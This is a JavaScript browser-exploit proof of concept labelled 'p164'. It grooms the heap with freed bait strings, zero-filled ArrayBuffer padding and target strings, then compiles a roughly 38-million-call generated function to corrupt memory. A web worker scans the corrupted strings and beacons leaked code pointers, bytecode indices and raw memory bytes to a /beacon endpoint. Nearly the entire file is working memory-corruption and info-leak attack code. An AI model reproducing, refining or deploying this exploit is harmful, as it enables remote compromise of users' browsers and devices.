// p164 — Zero-padded deep extraction
// Improvement over p162: adds 30×100KB zeroed ArrayBuffer padding between
// freed bait region and target strings. This creates a safe zone for OOB
// metadata reads — zeroed CallLinkInfo entries trigger slow-path safely
// instead of crashing on garbage pointer dereference.
//
// Layout: BAITS(20×100KB) → PADDING(30×100KB zeros) → TARGETS(14×100KB)
// After freeing baits: metadata fills freed slot → sweep forward through
// padding (safe reads) → targets (corruption!) → callback throws (stops sweep)
//
// Beacon prefix: V164-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER (deep charCodeAt scan) ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V164-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              beacon('HIT-' + i + '-len=' + targets[i].length);
              found = true;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
        }

        // Count all corrupted strings first
        var corruptCount = 0;
        for (var i = 0; i < targets.length; i++) {
          if (targets[i].length !== STR_LEN) corruptCount++;
        }
        beacon('CORRUPT-' + corruptCount + '-of-' + targets.length);

        // Deep scan each corrupted string
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len === STR_LEN) continue;

          beacon('S' + i + '-len=' + len);

          var maxScan = Math.min(len, 2000);
          if (maxScan <= 0) { beacon('S' + i + '-BAD'); continue; }

          var nonCanary = [];
          for (var b = 0; b < maxScan; b++) {
            try {
              var ch = targets[i].charCodeAt(b);
              if (ch !== CANARY) nonCanary.push({ off: b, val: ch });
            } catch(e) { break; }
          }

          beacon('NC' + i + '-count=' + nonCanary.length);

          if (nonCanary.length > 0) {
            beacon('FIRST' + i + '-off=' + nonCanary[0].off + '-v=' + hx(nonCanary[0].val));

            var ncStr = '';
            for (var n = 0; n < Math.min(40, nonCanary.length); n++) {
              ncStr += nonCanary[n].off + ':' + hx(nonCanary[n].val) + ',';
            }
            beacon('NCA' + i + '-' + ncStr.substring(0, 200));
            if (ncStr.length > 200) beacon('NCB' + i + '-' + ncStr.substring(200, 400));

            var entryBase = nonCanary[0].off;

            // Read 8 bytes at entryBase+24 (code pointer) as little-endian
            if (entryBase + 32 <= maxScan) {
              var ptrHex = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptrHex += hx(targets[i].charCodeAt(entryBase + 24 + pb)); }
                catch(e) { ptrHex += 'XX'; }
              }
              beacon('CPTR' + i + '-' + ptrHex);
            }

            // Read 4 bytes at entryBase+68 (bytecodeIndex) as little-endian
            if (entryBase + 72 <= maxScan) {
              var bciHex = '';
              for (var bb = 3; bb >= 0; bb--) {
                try { bciHex += hx(targets[i].charCodeAt(entryBase + 68 + bb)); }
                catch(e) { bciHex += 'XX'; }
              }
              beacon('BCI' + i + '-' + bciHex);
            }

            // Dump raw 112 bytes from entry start
            if (entryBase + 112 <= maxScan) {
              var rawA = '';
              for (var rb = 0; rb < 56; rb++) {
                try { rawA += hx(targets[i].charCodeAt(entryBase + rb)); }
                catch(e) { rawA += 'XX'; break; }
              }
              beacon('RA' + i + '-' + rawA);
              var rawB = '';
              for (var rb = 56; rb < 112; rb++) {
                try { rawB += hx(targets[i].charCodeAt(entryBase + rb)); }
                catch(e) { rawB += 'XX'; break; }
              }
              beacon('RB' + i + '-' + rawB);
            }

            // Second entry at +112 for comparison
            if (entryBase + 224 <= maxScan) {
              var ptr2 = '';
              for (var pb = 7; pb >= 0; pb--) {
                try { ptr2 += hx(targets[i].charCodeAt(entryBase + 112 + 24 + pb)); }
                catch(e) { ptr2 += 'XX'; }
              }
              beacon('CPTR' + i + 'b-' + ptr2);
            }
          } else {
            beacon('ALLCANARY' + i);
            var deepHit = -1;
            for (var b = 2000; b < Math.min(len, 50000); b++) {
              try {
                if (targets[i].charCodeAt(b) !== CANARY) {
                  deepHit = b;
                  break;
                }
              } catch(e) { break; }
            }
            if (deepHit >= 0) {
              beacon('DHIT' + i + '-' + deepHit + '-v=' + hx(targets[i].charCodeAt(deepHit)));
            } else {
              beacon('NOENTRY' + i);
            }
          }

          if (i >= 2) break;
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: ZERO-FILL PADDING ──
  // 30×100KB zeroed ArrayBuffers between bait region and targets.
  // When metadata lands in a freed bait slot, OOB reads hit zeros = safe.
  var N_PAD = 30;
  B('PAD-START');
  var padding = [];
  for (var i = 0; i < N_PAD; i++) {
    padding.push(new ArrayBuffer(STR_LEN));
  }
  B('PAD-DONE-' + N_PAD);

  // ── PHASE 3: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 4: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 5: BUILD + CALL WITH THROWING CALLBACK ──
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v164fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v164ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v164ok ? 'OK' : 'FAIL'));
      if (!window.__v164fn) { B('NO-FN'); return; }

      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        // Throwing callback: stops the sweep after LIMIT calls.
        // ~893 entries in buffer + ~26786 in padding + ~12500 in targets = ~40179
        // Set limit to 50000 for safety margin past all targets.
        var callCount = 0;
        var LIMIT = 50000;
        var cb = function() {
          if (++callCount > LIMIT) throw 'v164-stop';
        };

        B('CALLING-limit=' + LIMIT);
        try {
          window.__v164fn(cb);
          B('SURVIVED');
        } catch(ex) {
          var msg = (typeof ex === 'string') ? ex : (ex.message || '').substring(0, 30);
          B('CATCH-' + msg + '-at=' + callCount);
        }
        B('POST-calls=' + callCount);

        // Keep padding alive (don't let GC reclaim)
        if (padding && padding.length > 0) {
          B('PAD-ALIVE-' + padding.length);
        }
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
